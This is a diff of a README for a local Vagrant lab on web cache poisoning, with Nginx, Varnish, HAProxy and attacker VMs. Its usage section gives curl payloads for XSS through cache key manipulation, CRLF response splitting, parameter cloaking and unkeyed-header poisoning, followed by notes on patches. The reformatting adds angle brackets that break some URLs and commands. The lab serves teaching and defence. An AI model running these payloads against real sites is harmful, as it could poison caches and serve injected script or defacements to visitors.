@@ -1,14 +1,15 @@
 # Aboiye-DevSecOps-Projects
+
 Documentation for my DevSecOps Projects
 
-
-# Cache Poisoning Lab
+## Cache Poisoning Lab
 
 This project is a Vagrant-based local lab designed to explore cache poisoning vulnerabilities, exploit them, and learn how to patch them. It simulates a web application stack with a web server, caching server, load balancer, and attacker machine, providing hands-on experience with cybersecurity concepts like cache key manipulation, HTTP response splitting, and parameter cloaking.
 
 ## Project Overview
 
 The lab replicates a realistic web stack to study cache poisoning:
+
 - **Web Server**: Nginx serving static and dynamic content.
 - **Caching Server**: Varnish as a reverse proxy with caching capabilities.
 - **Load Balancer**: HAProxy distributing traffic.
@@ -38,69 +39,77 @@ graph TD
     classDef cache fill:#bfb,stroke:#333,stroke-width:2px;
     classDef webserver fill:#bfb,stroke:#333,stroke-width:2px;
 ```
-Prerequisites
 
-    Vagrant
-    VirtualBox (or another Vagrant provider)
-    Basic knowledge of Linux, networking, and HTTP
+## Prerequisites
 
-Setup Instructions
+Vagrant
+VirtualBox (or another Vagrant provider)
+Basic knowledge of Linux, networking, and HTTP
 
-    Clone the Repository:
-    bash
+## Setup Instructions
 
-git clone <your-repo-url>
+Clone the Repository:
+
+```bash
+git clone <git@github.com>:Abwonder/Aboiye-DevSecOps-Projects.git
 cd cache-poisoning-lab
-Start the Lab:
-bash
+```
 
-    vagrant up
-    This provisions four VMs: web, cache, lb, and attacker.
-    Access the Components:
-        Web Server: 192.168.50.10
-        Caching Server: 192.168.50.20
-        Load Balancer: 192.168.50.30 (entry point)
-        Attacker: 192.168.50.40
+Start the Lab:
+
+```bash
+vagrant up
+```
+
+This provisions four VMs: web, cache, lb, and attacker.
+Access the Components:
+    Web Server: 192.168.50.10
+    Caching Server: 192.168.50.20
+    Load Balancer: 192.168.50.30 (entry point)
+    Attacker: 192.168.50.40
 
 Usage
 Exploring Vulnerabilities
 
-    Cache Key Manipulation:
-        From the attacker VM: curl -H "Host: example.com" "http://192.168.50.30/dynamic.php?user=<script>alert('Hacked')</script>"
-        Test as victim: curl http://192.168.50.30/dynamic.php
-    HTTP Response Splitting:
-        curl -H "Host: example.com" "http://192.168.50.30/dynamic.php?user=Alice%0d%0aContent-Length:%200%0d%0a%0d%0a<h1>Defaced!</h1>"
-    Parameter Cloaking:
-        curl -H "Host: example.com" "http://192.168.50.30/dynamic.php?user=Normal;user=<script>alert('XSS')</script>"
-    Unkeyed Headers:
-        curl -H "Host: example.com" -H "Accept-Encoding: gzip" "http://192.168.50.30/dynamic.php?user=<h1>Poisoned</h1>"
+Cache Key Manipulation:
+    From the attacker VM: curl -H "Host: example.com" "<http://192.168.50.30/dynamic.php?user=><script>alert('Hacked')</script>"
+    Test as victim: curl <http://192.168.50.30/dynamic.php>
+HTTP Response Splitting:
+    curl -H "Host: example.com" "<http://192.168.50.30/dynamic.php?user=Alice%0d%0aContent-Length:%200%0d%0a%0d%0a><h1>Defaced!</h1>"
+Parameter Cloaking:
+    curl -H "Host: example.com" "<http://192.168.50.30/dynamic.php?user=Normal;user=><script>alert('XSS')</script>"
+Unkeyed Headers:
+    curl -H "Host: example.com" -H "Accept-Encoding: gzip" "<http://192.168.50.30/dynamic.php?user=><h1>Poisoned</h1>"
 
 Patching Vulnerabilities
 
-    Re-provision VMs with updated configs:
-    bash
+Re-provision VMs with updated configs:
 
-    vagrant provision web
-    vagrant provision cache
-    vagrant provision lb
-    Retest attacks to verify fixes (see configuration details in the Vagrantfile).
+```bash
+
+vagrant provision web
+vagrant provision cache
+vagrant provision lb
+```
+
+Retest attacks to verify fixes (see configuration details in the Vagrantfile).
 
 Files
 
-    Vagrantfile: Defines and provisions the VMs with initial vulnerable configs and patched versions.
-    README.md: This file.
+Vagrantfile: Defines and provisions the VMs with initial vulnerable configs and patched versions.
+README.md: This file.
 
-Learning Objectives
+## Learning Objectives
 
-    Understand how caching works in a web stack.
-    Exploit common cache poisoning techniques.
-    Implement mitigations like input sanitization, cache key normalization, and header validation.
+Understand how caching works in a web stack.
+Exploit common cache poisoning techniques.
+Implement mitigations like input sanitization, cache key normalization, and header validation.
 
-Patching Details
+## Patching Details
 
-    Nginx: Sanitizes input with htmlspecialchars and adds Cache-Control: no-store.
-    Varnish: Keys on headers, skips caching dynamic content, respects backend cache directives.
-    HAProxy: Rejects malformed headers and rate-limits requests.
+Nginx: Sanitizes input with htmlspecialchars and adds Cache-Control: no-store.
+Varnish: Keys on headers, skips caching dynamic content, respects backend cache directives.
+HAProxy: Rejects malformed headers and rate-limits requests.
 
 Contributing
 
